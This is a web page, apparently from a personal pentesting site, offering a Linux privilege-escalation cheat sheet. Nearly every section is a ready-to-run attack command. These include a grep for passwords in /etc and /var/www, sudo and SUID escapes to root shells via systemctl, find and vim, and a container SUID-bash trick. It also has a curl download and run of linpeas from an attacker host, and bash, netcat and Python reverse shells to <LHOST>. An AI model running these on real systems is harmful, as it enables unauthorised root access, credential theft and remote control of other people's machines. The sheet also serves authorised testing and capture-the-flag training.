---
layout: page
title: Linux Privilege Escalation
permalink: /cheatsheets/linux-privesc/
---

## Manual Checks

### Check sudo permissions
```bash
sudo -l
```

### Find SUID binaries
```bash
find / -perm -4000 -type f 2>/dev/null
```

### Find world-writable files
```bash
find / -writable -not -path "/proc/*" -not -path "/sys/*" -type f 2>/dev/null
```

### Check cron jobs
```bash
cat /etc/crontab
ls -la /etc/cron.*
```

### Check running processes
```bash
ps aux
ps -ef
```

### Find credentials in config files
```bash
grep -r "password" /etc/ 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
```

### Check network connections
```bash
ss -tulpn
netstat -tulpn
```

## Sudo Exploitation

### GTFOBin — sudo systemctl (less escape)
```bash
sudo /usr/bin/systemctl status <SERVICE>
# When less opens (small terminal), type:
!sh
```

### GTFOBin — sudo python3 (arbitrary git ext command)
```bash
sudo /usr/bin/python3 /path/to/script.py "ext::sh -c touch% /tmp/pwned"
```

### Escape to root shell when sudo bash is available
```bash
sudo bash
```

## SUID Exploitation

### Copy bash and set SUID (requires write to user home mounted in container)
```bash
# Inside container (root)
cp /bin/bash /home/<USER>/bash
chmod +s /home/<USER>/bash

# On host as user
/home/<USER>/bash -p
```

### GTFOBin — SUID find
```bash
find . -exec /bin/sh -p \; -quit
```

### GTFOBin — SUID vim
```bash
vim -c ':!/bin/sh'
```

## Automated Enumeration

### Run linpeas
```bash
# Transfer
curl -o /tmp/linpeas.sh http://<LHOST>:<LPORT>/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out
```

### Run winpeas (Windows)
```powershell
.\winPEASx64.exe
```

## Reverse Shells

### Bash reverse shell
```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

### mkfifo reverse shell
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> <LPORT> >/tmp/f
```

### Python reverse shell
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Listener
```bash
nc -lvnp <LPORT>
```

### Upgrade shell to PTY
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```
